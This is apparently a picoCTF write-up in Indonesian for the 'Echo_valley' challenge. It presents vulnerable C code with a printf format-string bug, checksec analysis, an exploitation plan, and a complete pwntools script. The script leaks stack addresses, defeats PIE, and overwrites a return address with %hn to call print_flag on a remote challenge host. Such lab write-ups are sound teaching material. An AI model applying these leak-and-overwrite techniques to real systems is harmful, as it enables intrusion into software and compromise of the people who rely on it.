# Echo_valley
## Problem
```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void print_flag() {
    char buf[32];
    FILE *file = fopen("/home/valley/flag.txt", "r");

    if (file == NULL) {
      perror("Failed to open flag file");
      exit(EXIT_FAILURE);
    }
    
    fgets(buf, sizeof(buf), file);
    printf("Congrats! Here is your flag: %s", buf);
    fclose(file);
    exit(EXIT_SUCCESS);
}

void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);
}

int main()
{
    echo_valley();
    return 0;
}

```

## Analisis
Hasil checksec:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      Canary found      NX enabled    PIE enabled     No RPATH   No RUNPATH   49 Symbols	  No	0		2		valley

```
Analisis checksec:
* Stack canary tidak relevan karena tidak ada celah untuk melakukan overflow (Input menggunakan fgets dengan size yang sesuai dan ditambah force \x00 byte di akhir setelahnya)
* No eXecute tidak akan menjadi masalah karena kita tidak akan menyuntikan shellcode ke stack, di lain hal ukuran stack yang kita punya (Maksudnya buf) terlalu kecil jika tidak bisa overflow
* PIE membuat kita harus mencari base address

Potongan kode yang perlu diperhatikan:
```
void echo_valley() {
    printf("Welcome to the Echo Valley, Try Shouting: \n");

    char buf[100];

    while(1)
    {
        fflush(stdout);
        if (fgets(buf, sizeof(buf), stdin) == NULL) {
          printf("\nEOF detected. Exiting...\n");
          exit(0);
        }

        if (strcmp(buf, "exit\n") == 0) {
            printf("The Valley Disappears\n");
            break;
        }

        printf("You heard in the distance: ");
        printf(buf);
        fflush(stdout);
    }
    fflush(stdout);
}

```
Terdapat satu kerentanan dalam fungsi ini, yaitu format string vuln, di lain hal, terdapat infinite loop, jadi kita bisa terus menerus eksploitasi vuln satu ini.

## Rencana
* Uji coba spam %p. (hasilnya adalah offset buffer ada di 6, saved prior rbp di 20, dan return address location di 21)
* Iterasi pertama: leak return address dan saved prior rbp
* Gunakan return address (*main+18) untuk menghitung base address, dengan cara
```
elf.address = return_address - (elf.sym['main'] + 18)
```
* Gunakan leak address saved_prior_rbp_address untuk mendapatkan lokasi return_address dengan cara
```
return_address_location = saved_prior_rbp - 0x8
```
* Perlu diketahui bahwa:
```
address_main_+_18 - address_print_flag = 0x1AA
```
* Sehingga untuk overwrite return address kita hanya perlu overwrite 2 byte terakhir saja (hal penting, karena payload kita terbatas)
* Iterasi ketiga: exit

## Payload
```
#!/usr/bin/env python3
from pwn import *

context.binary = ELF('./valley')

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#p = process('./valley')
p = remote('shape-facility.picoctf.net', 51515)
"""
p = gdb.debug('./valley', gdbscript='''
b *echo_valley + 218
b *main+18
b *echo_valley + 106
continue
''')
"""

# --- Stage 1: leak saved RBP and return address ---
p.sendlineafter(b'Try Shouting: \n', b'%20$p.%21$p')
p.recvuntil(b'You heard in the distance: ')
leak = p.recvline().strip().decode()
saved_rbp, ret_addr = [int(x, 16) for x in leak.split('.')]
log.info(f'Saved RBP: {hex(saved_rbp)}  |  Return addr: {hex(ret_addr)}')

# Calculate print_flag address
context.binary.address = ret_addr - (context.binary.sym['main'] + 18)
print_flag = context.binary.sym['print_flag']
ret_addr_loc = saved_rbp - 0x8

log.info(f'print_flag: {hex(print_flag)}')
log.info(f'Return addr location: {hex(ret_addr_loc)}')

# Only need lower 2 bytes of print_flag
# (upper 6 bytes are same as main+18 since they're in the same PIE mapping)
lower_two = print_flag & 0xffff
log.info(f'Lower 2 bytes to write: {hex(lower_two)}')

# --- Stage 2: overwrite lower 2 bytes with %hn ---
# Place return address location in buffer, then write to it
# buf is at offset 6, address lands at offset X (depends on alignment)

# Simple approach: pad format string to align address, use %hn
payload = f'%{lower_two}c%8$hn'.encode()
# Add null and pad to 8-byte alignment
payload += b'\x00'
pad_len = (8 - len(payload) % 8) % 8
payload += b'A' * pad_len
payload += p64(ret_addr_loc)

log.info(f'Payload length: {len(payload)}')
assert len(payload) <= 100

p.sendline(payload)
p.sendline('exit')

p.interactive()

```